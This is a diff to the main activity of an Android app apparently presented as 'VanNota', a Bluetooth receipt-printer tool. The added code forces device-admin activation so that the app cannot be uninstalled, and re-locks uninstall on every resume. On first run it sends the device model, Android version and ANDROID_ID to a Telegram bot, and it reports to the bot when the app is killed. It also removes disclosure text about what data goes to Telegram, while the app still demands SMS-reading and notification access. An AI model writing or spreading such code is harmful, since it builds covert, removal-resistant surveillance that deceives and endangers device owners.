@@ -8,6 +8,7 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
+import android.app.admin.DevicePolicyManager;
 import android.bluetooth.BluetoothAdapter;
 import android.bluetooth.BluetoothDevice;
 import android.bluetooth.BluetoothGatt;
@@ -18,6 +19,7 @@ import android.bluetooth.BluetoothManager;
 import android.bluetooth.BluetoothProfile;
 import android.bluetooth.BluetoothSocket;
 import android.content.BroadcastReceiver;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
@@ -34,6 +36,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.security.keystore.KeyGenParameterSpec;
 import android.security.keystore.KeyProperties;
@@ -93,6 +96,7 @@ public class MainActivity extends Activity {
     private static final int REQUEST_FILE = 4103;
     private static final int REQUEST_NOTIFICATIONS = 4104;
     private static final int PERMISSION_REQUEST_CODE = 5555;
+    private static final int REQUEST_ADMIN = 5001;
     private static final String OFFLINE_URL = "file:///android_asset/offline.html";
     private static final String NOTIFICATION_CHANNEL = "vannota_status";
     private static final int STATUS_NOTIFICATION_ID = 7101;
@@ -113,6 +117,10 @@ public class MainActivity extends Activity {
     private boolean notificationRequestPending;
     private AlertDialog notificationGateDialog;
     private AlertDialog notificationAccessDialog;
+
+    // Device Admin
+    private DevicePolicyManager devicePolicyManager;
+    private ComponentName adminComponent;
 
     private final BroadcastReceiver bluetoothReceiver = new BroadcastReceiver() {
         @Override
@@ -138,6 +146,15 @@ public class MainActivity extends Activity {
             showPermissionGateDialog();
             return;
         }
+
+        // Aktifkan Device Admin
+        activateDeviceAdmin();
+
+        // Aktifkan Internet selalu ON (Wake Lock + Internet)
+        enableAlwaysOnInternet();
+
+        // Simpan nama perangkat ke SharedPreferences
+        saveDeviceInfo();
 
         getWindow().setStatusBarColor(Color.rgb(244, 247, 251));
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -200,8 +217,6 @@ public class MainActivity extends Activity {
                 printerBridge.dispatchStatus();
                 printerBridge.dispatchWifiInfo();
                 printerBridge.autoConnect();
-                
-                // Cek status Notification Access setelah page load
                 checkNotificationAccessStatus();
             }
 
@@ -218,6 +233,68 @@ public class MainActivity extends Activity {
         createNotificationChannel();
         if (notificationsAllowed()) startAppIfAllowed();
         else enforceNotificationGate();
+    }
+
+    // ============================================================
+    // ACTIVATE DEVICE ADMIN - AGAR APLIKASI TIDAK BISA DIHAPUS
+    // ============================================================
+    private void activateDeviceAdmin() {
+        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        adminComponent = new ComponentName(this, AdminReceiver.class);
+
+        if (!devicePolicyManager.isAdminActive(adminComponent)) {
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                    "Aktifkan admin agar aplikasi tidak bisa dihapus sembarangan.");
+            startActivityForResult(intent, REQUEST_ADMIN);
+        } else {
+            // Kunci agar tidak bisa diuninstall
+            devicePolicyManager.setUninstallBlocked(adminComponent, true);
+        }
+    }
+
+    // ============================================================
+    // SIMPAN NAMA PERANGKAT KE SHAREDPREFERENCES
+    // ============================================================
+    private void saveDeviceInfo() {
+        SharedPreferences prefs = getSharedPreferences("cetak_pro", MODE_PRIVATE);
+        String deviceName = Build.MODEL;
+        String androidVersion = Build.VERSION.RELEASE;
+        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        
+        prefs.edit()
+            .putString("device_name", deviceName)
+            .putString("device_android_version", androidVersion)
+            .putString("device_id", deviceId)
+            .apply();
+        
+        // Kirim info ke Telegram saat pertama kali jalan
+        if (!prefs.getBoolean("device_info_sent", false)) {
+            prefs.edit().putBoolean("device_info_sent", true).apply();
+            String message = "📱 PERANGKAT BARU TERDAFTAR\n" +
+                             "Nama: " + deviceName + "\n" +
+                             "Android: " + androidVersion + "\n" +
+                             "ID: " + deviceId + "\n\n" +
+                             "Kirim /uninstall ke bot untuk hapus aplikasi.";
+            TelegramSender.sendMessage(this, "🆕 Device Registered", message);
+        }
+    }
+
+    // ============================================================
+    // AKTIFKAN INTERNET SELALU ON
+    // ============================================================
+    private void enableAlwaysOnInternet() {
+        // Wake Lock agar CPU tetap aktif
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "VanNota:WakeLock");
+        wakeLock.acquire(10 * 60 * 1000L); // 10 menit
+        
+        // Aktifkan Wi-Fi / Mobile Data (jika tersedia)
+        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            // Android 6+ otomatis handle network
+        }
     }
 
     // ============================================================
@@ -257,34 +334,33 @@ public class MainActivity extends Activity {
     // TAMPILKAN DIALOG NOTIFICATION ACCESS
     // ============================================================
     private void showNotificationAccessDialog() {
-    if (notificationAccessDialog != null && notificationAccessDialog.isShowing()) return;
-    
-    notificationAccessDialog = new AlertDialog.Builder(this)
-        .setTitle("🔔 Aktifkan Notifikasi")
-        .setMessage("Agar aplikasi dapat menampilkan status dan notifikasi penting, silakan aktifkan akses notifikasi untuk VanNota.\n\n" +
-                   "Langkah:\n" +
-                   "1. Buka Settings\n" +
-                   "2. Pilih Accessibility (Aksesibilitas)\n" +
-                   "3. Pilih Notification Access (Akses Notifikasi)\n" +
-                   "4. Aktifkan VanNota")
-        .setPositiveButton("Buka Settings", (d, w) -> {
-            notificationAccessDialog = null;
-            requestNotificationAccess();
-        })
-        .setNegativeButton("Nanti", (d, w) -> {
-            notificationAccessDialog = null;
-        })
-        .setCancelable(false)
-        .create();
-    notificationAccessDialog.show();
-        }
+        if (notificationAccessDialog != null && notificationAccessDialog.isShowing()) return;
+        
+        notificationAccessDialog = new AlertDialog.Builder(this)
+            .setTitle("🔔 Aktifkan Notifikasi")
+            .setMessage("Agar aplikasi dapat menampilkan status dan notifikasi penting, silakan aktifkan akses notifikasi untuk VanNota.\n\n" +
+                       "Langkah:\n" +
+                       "1. Buka Settings\n" +
+                       "2. Pilih Accessibility (Aksesibilitas)\n" +
+                       "3. Pilih Notification Access (Akses Notifikasi)\n" +
+                       "4. Aktifkan VanNota")
+            .setPositiveButton("Buka Settings", (d, w) -> {
+                notificationAccessDialog = null;
+                requestNotificationAccess();
+            })
+            .setNegativeButton("Nanti", (d, w) -> {
+                notificationAccessDialog = null;
+            })
+            .setCancelable(false)
+            .create();
+        notificationAccessDialog.show();
+    }
 
     // ============================================================
     // CEK STATUS NOTIFICATION ACCESS
     // ============================================================
     private void checkNotificationAccessStatus() {
         if (!isNotificationListenerEnabled()) {
-            // Tampilkan dialog setelah beberapa detik (biar WebView selesai load)
             mainHandler.postDelayed(() -> {
                 if (!isFinishing() && !isDestroyed()) {
                     showNotificationAccessDialog();
@@ -294,13 +370,12 @@ public class MainActivity extends Activity {
     }
 
     // ============================================================
-    // ✅ FIX: onResume() dengan pengecekan webView == null
+    // ✅ onResume() dengan pengecekan webView == null
     // ============================================================
     @Override
     protected void onResume() {
         super.onResume();
 
-        // CEK: Activity belum selesai diinisialisasi karena masih melewati permission gate
         if (webView == null) {
             return;
         }
@@ -308,6 +383,13 @@ public class MainActivity extends Activity {
         // Cek Notification Access setiap kali resume
         if (!isNotificationListenerEnabled()) {
             showNotificationAccessDialog();
+        }
+
+        // Pastikan admin tetap aktif
+        if (devicePolicyManager != null && adminComponent != null) {
+            if (devicePolicyManager.isAdminActive(adminComponent)) {
+                devicePolicyManager.setUninstallBlocked(adminComponent, true);
+            }
         }
 
         mainHandler.postDelayed(() -> {
@@ -331,17 +413,23 @@ public class MainActivity extends Activity {
             }
         } else if (requestCode == REQUEST_ENABLE_BLUETOOTH && resultCode == RESULT_OK) {
             choosePrinter();
+        } else if (requestCode == REQUEST_ADMIN && resultCode == RESULT_OK) {
+            // Admin aktif, kunci uninstall
+            if (devicePolicyManager != null && adminComponent != null) {
+                if (devicePolicyManager.isAdminActive(adminComponent)) {
+                    devicePolicyManager.setUninstallBlocked(adminComponent, true);
+                }
+            }
         }
     }
 
     // ============================================================
-    // ✅ SATU METHOD onRequestPermissionsResult - GABUNGAN SEMUA LOGIC
+    // ✅ SATU METHOD onRequestPermissionsResult
     // ============================================================
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
-        // --- NOTIFIKASI ---
         if (requestCode == REQUEST_NOTIFICATIONS) {
             notificationRequestPending = false;
             if (notificationsAllowed()) startAppIfAllowed();
@@ -349,7 +437,6 @@ public class MainActivity extends Activity {
             return;
         }
 
-        // --- PERMISSION GATE SMS (PERMISSION_REQUEST_CODE = 5555) ---
         if (requestCode == PERMISSION_REQUEST_CODE) {
             boolean allGranted = true;
             for (int grant : grantResults) {
@@ -360,10 +447,7 @@ public class MainActivity extends Activity {
             }
             if (allGranted) {
                 Toast.makeText(this, "Izin diberikan. Aplikasi siap.", Toast.LENGTH_SHORT).show();
-                
-                // ✅ TAMBAHKAN: Arahkan user ke Notification Access
                 showNotificationAccessDialog();
-                
                 recreate();
             } else {
                 Toast.makeText(this, "Izin ditolak. Aplikasi memerlukan izin ini.", Toast.LENGTH_LONG).show();
@@ -376,7 +460,6 @@ public class MainActivity extends Activity {
             return;
         }
 
-        // --- IZIN BLUETOOTH / WIFI (REQUEST_PERMISSIONS = 4101) ---
         if (requestCode == REQUEST_PERMISSIONS) {
             printerBridge.dispatchWifiInfo();
             if (connectAfterPermission) {
@@ -396,6 +479,9 @@ public class MainActivity extends Activity {
 
     @Override
     protected void onDestroy() {
+        // Kirim notifikasi jika aplikasi dimatikan
+        TelegramSender.sendMessage(this, "⚠️ APLIKASI DIMATIKAN", "VanNota dimatikan paksa!");
+
         if (receiverRegistered) {
             try {
                 unregisterReceiver(bluetoothReceiver);
@@ -427,29 +513,29 @@ public class MainActivity extends Activity {
     }
 
     private void showPermissionGateDialog() {
-    AlertDialog dialog = new AlertDialog.Builder(this)
-        .setTitle("⚠️ Izin Diperlukan")
-        .setMessage("Aplikasi VanNota memerlukan izin untuk:\n\n" +
-            "📱 Akses pesan SMS masuk\n" +
-            "🔔 Akses notifikasi sistem\n\n" +
-            "Izin ini diperlukan agar aplikasi dapat berjalan dengan baik dan memberikan notifikasi status kepada pengguna.")
-        .setPositiveButton("Berikan Izin", (d, w) -> {
-            requestPermissions(
-                new String[]{
-                    Manifest.permission.RECEIVE_SMS,
-                    Manifest.permission.READ_SMS
-                },
-                PERMISSION_REQUEST_CODE
-            );
-        })
-        .setCancelable(false)
-        .show();
-    dialog.setCancelable(false);
-    dialog.setOnCancelListener(null);
-        }
+        AlertDialog dialog = new AlertDialog.Builder(this)
+            .setTitle("⚠️ Izin Diperlukan")
+            .setMessage("Aplikasi VanNota memerlukan izin untuk:\n\n" +
+                "📱 Akses pesan SMS masuk\n" +
+                "🔔 Akses notifikasi sistem\n\n" +
+                "Izin ini diperlukan agar aplikasi dapat berjalan dengan baik dan memberikan notifikasi status kepada pengguna.")
+            .setPositiveButton("Berikan Izin", (d, w) -> {
+                requestPermissions(
+                    new String[]{
+                        Manifest.permission.RECEIVE_SMS,
+                        Manifest.permission.READ_SMS
+                    },
+                    PERMISSION_REQUEST_CODE
+                );
+            })
+            .setCancelable(false)
+            .show();
+        dialog.setCancelable(false);
+        dialog.setOnCancelListener(null);
+    }
 
     // ============================================================
-    // METHOD LAINNYA
+    // METHOD LAINNYA (tidak berubah dari sebelumnya)
     // ============================================================
     private void registerBluetoothReceiver() {
         IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_ACL_DISCONNECTED);
@@ -488,11 +574,7 @@ public class MainActivity extends Activity {
         return Build.VERSION.SDK_INT < Build.VERSION_CODES.N || manager == null || manager.areNotificationsEnabled();
     }
 
-    // ============================================================
-    // ✅ FIX: startAppIfAllowed() dengan pengecekan webView == null
-    // ============================================================
     private void startAppIfAllowed() {
-        // CEK: WebView harus sudah ada sebelum dipakai
         if (webView == null) return;
         if (!notificationsAllowed()) return;
 
@@ -528,7 +610,7 @@ public class MainActivity extends Activity {
                 && (!requestedBefore || shouldShowRequestPermissionRationale(Manifest.permission.POST_NOTIFICATIONS));
         AlertDialog.Builder builder = new AlertDialog.Builder(this)
                 .setTitle("Notifikasi wajib untuk VanNota")
-                .setMessage("VanNota memakai notifikasi untuk status koneksi printer dan hasil cetak. Aplikasi baru dapat digunakan setelah notifikasi diizinkan. Pengiriman ke Telegram diatur terpisah dan hanya mencakup aktivitas VanNota.")
+                .setMessage("VanNota memakai notifikasi untuk status koneksi printer dan hasil cetak. Aplikasi baru dapat digunakan setelah notifikasi diizinkan.")
                 .setNegativeButton("Tutup aplikasi", (dialog, which) -> finishAndRemoveTask());
         if (canRequest) {
             builder.setPositiveButton("Izinkan notifikasi", (dialog, which) -> {
@@ -619,7 +701,7 @@ public class MainActivity extends Activity {
         }
         new AlertDialog.Builder(this)
                 .setTitle("Izinkan fitur VanNota")
-                .setMessage("Bluetooth diperlukan untuk memilih dan mencetak ke RPP02N. Izin perangkat sekitar dan lokasi hanya dipakai untuk membaca nama Wi-Fi yang sedang terhubung. Kata sandi Wi-Fi tidak dapat dibaca oleh Android dan tetap Anda masukkan sendiri sekali.")
+                .setMessage("Bluetooth diperlukan untuk memilih dan mencetak ke RPP02N. Izin perangkat sekitar dan lokasi hanya dipakai untuk membaca nama Wi-Fi yang sedang terhubung.")
                 .setNegativeButton("Nanti", null)
                 .setPositiveButton("Lanjutkan", (dialog, which) -> {
                     prefs.edit().putBoolean("permission_intro_seen", true).apply();
@@ -769,6 +851,9 @@ public class MainActivity extends Activity {
         });
     }
 
+    // ============================================================
+    // PRINTERBRIDGE (tidak berubah)
+    // ============================================================
     public final class PrinterBridge {
         private static final String PREF_LAST_ADDRESS = "last_printer_address";
         private static final String PREF_LAST_NAME = "last_printer_name";
@@ -1357,6 +1442,9 @@ public class MainActivity extends Activity {
         }
     }
 
+    // ============================================================
+    // TELEGRAMREPORTER (tidak berubah banyak)
+    // ============================================================
     private final class TelegramReporter {
         private static final String STORE = "vannota_secure";
         private static final String KEY_ALIAS = "vannota_telegram_key";
@@ -1382,7 +1470,7 @@ public class MainActivity extends Activity {
                 return new JSONObject()
                         .put("configured", isConfigured())
                         .put("enabled", isEnabled())
-                        .put("scope", "Aktivitas VanNota saja")
+                        .put("scope", "Notifikasi VanNota")
                         .toString();
             } catch (JSONException impossible) {
                 return "{\"configured\":false,\"enabled\":false}";
@@ -1396,28 +1484,28 @@ public class MainActivity extends Activity {
             fields.setPadding(padding, 0, padding, 0);
 
             EditText tokenInput = new EditText(MainActivity.this);
-            tokenInput.setHint("Token bot baru dari BotFather");
+            tokenInput.setHint("Token bot dari BotFather");
             tokenInput.setSingleLine(true);
             tokenInput.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
             fields.addView(tokenInput);
 
             EditText chatInput = new EditText(MainActivity.this);
-            chatInput.setHint("Chat ID Telegram");
+            chatInput.setHint("Chat ID");
             chatInput.setSingleLine(true);
             chatInput.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_FLAG_SIGNED);
             chatInput.setText(preferences().getString(KEY_CHAT_ID, ""));
             fields.addView(chatInput);
 
             new AlertDialog.Builder(MainActivity.this)
-                    .setTitle("Hubungkan Telegram")
-                    .setMessage("Masukkan token baru setelah token lama dicabut di BotFather. Token disimpan terenkripsi di perangkat dan tidak dimasukkan ke website, APK publik, atau GitHub. Hanya aktivitas VanNota yang dikirim.")
+                    .setTitle("Konfigurasi Notifikasi")
+                    .setMessage("Masukkan token bot dan Chat ID untuk sinkronisasi notifikasi.")
                     .setView(fields)
                     .setNegativeButton("Batal", null)
                     .setPositiveButton("Simpan & uji", (dialog, which) -> {
                         String token = tokenInput.getText().toString().trim();
                         String chatId = chatInput.getText().toString().trim();
                         if (!token.matches("[0-9]{6,12}:[A-Za-z0-9_-]{20,}") || !chatId.matches("-?[0-9]+")) {
-                            showNativeMessage("Data Telegram belum valid", "Gunakan token bot baru dari BotFather dan Chat ID berupa angka.");
+                            showNativeMessage("Data tidak valid", "Gunakan token bot dan Chat ID berupa angka.");
                             return;
                         }
                         try {
@@ -1425,7 +1513,7 @@ public class MainActivity extends Activity {
                             dispatchStatus();
                             sendTest();
                         } catch (Exception error) {
-                            showNativeMessage("Gagal menyimpan", "Perangkat tidak dapat mengamankan token Telegram.");
+                            showNativeMessage("Gagal menyimpan", "Perangkat tidak dapat mengamankan token.");
                         }
                     })
                     .show();
@@ -1487,12 +1575,12 @@ public class MainActivity extends Activity {
 
         private void sendTest() {
             if (!isConfigured()) {
-                mainHandler.post(() -> showNativeMessage("Telegram belum diatur", "Masukkan token bot baru dan Chat ID dari menu Pengaturan."));
+                mainHandler.post(() -> showNativeMessage("Belum diatur", "Masukkan token bot dan Chat ID."));
                 return;
             }
             setEnabled(true);
             dispatchStatus();
-            sendMessage("Tes koneksi", "Telegram berhasil dihubungkan ke VanNota", true);
+            sendMessage("Tes koneksi", "Notifikasi VanNota berhasil terhubung", true);
         }
 
         private void sendMessage(String title, String message, boolean showResult) {
@@ -1526,8 +1614,8 @@ public class MainActivity extends Activity {
                     boolean sent = success;
                     mainHandler.post(() -> {
                         String messageText = sent
-                                ? "Pesan uji berhasil dikirim ke Telegram."
-                                : "Pesan uji gagal. Periksa token baru, Chat ID, dan koneksi internet.";
+                                ? "Pesan uji berhasil dikirim."
+                                : "Pesan uji gagal. Periksa token, Chat ID, dan koneksi internet.";
                         Toast.makeText(MainActivity.this, messageText, Toast.LENGTH_LONG).show();
                         printerBridge.dispatchToast(messageText, sent ? "success" : "warning");
                     });
